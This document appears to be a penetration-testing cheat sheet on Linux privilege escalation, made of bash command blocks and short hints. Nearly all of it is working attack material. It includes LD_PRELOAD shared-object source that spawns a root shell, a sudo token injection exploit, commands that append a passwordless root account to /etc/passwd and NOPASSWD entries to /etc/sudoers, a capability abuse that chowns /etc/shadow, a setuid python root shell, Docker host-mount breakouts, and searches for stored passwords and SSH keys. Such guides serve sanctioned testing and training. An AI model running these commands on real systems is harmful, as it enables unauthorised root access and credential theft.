# Manual Checks

{% hint style="info" %}
<mark style="color:blue;">Manual checks can help</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**understand way more how attacks work**</mark><mark style="color:blue;">. Check this out !</mark>
{% endhint %}

## Walkthrough (Kinda)

```bash
'''
SUDO
'''
sudo -l
sudo su
# check sudo version for exploits
sudo -V | grep “Sudo ver”

# sudo LD_PRELOAD
Defaults        env_keep += LD_PRELOAD
# COMPILE :

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
# with :
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute any binary with the LD_PRELOAD to spawn a shell : 
sudo LD_PRELOAD=<full_path_to_so_file> <program>
sudo LD_PRELOAD=/tmp/shell.so find

# sudo_inject | https://github.com/nongiach/sudo_inject
# requirements : 
#    Ptrace fully enabled (/proc/sys/kernel/yama/ptrace_scope == 0).
#    Current user must have living process that has a valid sudo token with the same uid.
sudo whatever
sh exploit.sh
# wait
sudo -i
# root !

'''
USER INFOS
'''
id
wwhoami
w
last
cat /etc/passwd
cat /etc/sudoers
cat /etc/group

'''
KERNEL
'''
uname -a 
lsb_release -a
cat /proc/version /etc/issue /etc/*-release

'''
FILES/BINARIES & PASSWORDS
'''
ls -la ~/ 
ls -la /var/mail /home/*/ /var/spool/mail /home/*/.bash_history /var

# check those files for hashes
cat /etc/passwd
cat /etc/shadow
ls -la /etc/passwd /etc/shadow

# can we write to the .bashsrc file ? if so, can be executed when us logs in
ls -la /root/.bashrc 
ls -la /home/*/.bashrc
locate .bashrc
find / -name .bashrc -xdev 2>/dev/null

'''
PROCESSES / PORTS
'''
# something is running that we can exploit ?
ps aux | grep root

# localhost open ports ?
netstat -antup

# any useful info in the main bash user files ?
cat /etc/profile 
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout

'''
CRONJOBS
'''
# check for cronjobs
crontab -l 
ls -alh /var/spool/cron
ls -al /etc/ | grep cron; ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

# PSPY to to see commands run by other users, cron jobs, etc. in real time
./pspy > pspy-out.txt

'''
FILE SYSTEMS
'''
# unmounted file-systems ?
cat /etc/fstab

# If NFS is open, check if the target has any open NFS shares, if it does, then mount it to your filesystem
showmount -e X.X.X.X
mount X.X.X.X:/ /tmp/

'''
APPS
'''
# check installed apps + versions + running ?
ls -alh /usr/bin/ /sbin/ /var/cache/apt/archives /var/cache/yum/
dpkg -l
rpm -qa
# Any useful applications installed? 
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp tmux screen nmap 2>/dev/null

'''
SESSIONS
'''
# can we hijack any shell sessions ?
tmux ls
tmux attach -t tmuxname 
screen -ls
screen-dr sessionname
byobu list-session

'''
MEMORY
'''
# some services can save clear-text creds in memory
ps aux # grab the process id
gdb -p SERVICE; gdb PROCID
Files permissions
If you fin something interesting, check
```

#### Files permissions

{% hint style="info" %}
<mark style="color:blue;">If you fin something interesting, check</mark> [<mark style="color:blue;">**GTFOBins**</mark>](https://gtfobins.github.io/)<mark style="color:blue;">.</mark>
{% endhint %}

```bash
# Files containing passwords
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

# in memory passwords
strings /dev/mem -n10 | grep -i PASS

# ssh
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null

# World writable files on the system
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null

# writable /etc/passwd
# add :
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy

# writable /etc/sudoers
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers


# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

# SUID
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null

# last edited files (last 10min)
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

#### Capabilities

{% hint style="info" %}
<mark style="color:blue;">Check for files with</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**capabilities**</mark><mark style="color:blue;">. These may allow us to access restricted files or directories. Having the capability **=ep** means the binary has all the capabilities.</mark>
{% endhint %}

```bash
/usr/bin/getcap -r  /usr/bin
getcap -r / 2>/dev/null

## Interesting capabilities
getcap openssl /usr/bin/openssl 
openssl=ep
#  the following capabilities can be used in order to upgrade your current privileges.
cap_dac_read_search # read anything
cap_setuid+ep # setuid

# EXAMPLES
# 1
# linpeas /usr/local/bin/ruby = cap_chown+ep 
echo 'File.chown(<User ID>, nil, "/etc/shadow")' > exploit.rb 
ruby exploit.rb 
chmod 777 /etc/shadow
nano /etc/shadow

# 2
# cap_setuid+ep python2.7
python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```
### Capabilities list
| Capabilities name  | Description |
|---|---|
| CAP_AUDIT_CONTROL  | Allow to enable/disable kernel auditing |
| CAP_AUDIT_WRITE  | Helps to write records to kernel auditing log |
| CAP_BLOCK_SUSPEND  | This feature can block system suspends   |
| CAP_CHOWN  | Allow user to make arbitrary change to files UIDs and GIDs |
| CAP_DAC_OVERRIDE  | This helps to bypass file read, write and execute permission checks |
| CAP_DAC_READ_SEARCH  | This only bypasses file and directory read/execute permission checks  |
| CAP_FOWNER  | This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file  |
| CAP_KILL  | Allow the sending of signals to processes belonging to others  |
| CAP_SETGID  | Allow changing of the GID  |
| CAP_SETUID  | Allow changing of the UID  |
| CAP_SETPCAP  | Helps to transferring and removal of current set to any PID |
| CAP_IPC_LOCK  | This helps to lock memory  |
| CAP_MAC_ADMIN  | Allow MAC configuration or state changes  |
| CAP_NET_RAW  | Use RAW and PACKET sockets |
| CAP_NET_BIND_SERVICE  | SERVICE Bind a socket to internet domain privileged ports  |

#### Docker

```bash
docker run -it -v /:/mnt bash chroot

docker run -v /root:/mnt -it bash
```
##### More about Docker
{% embed url="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout" %}

{% embed url="https://github.com/stealthcopter/deepce" %}
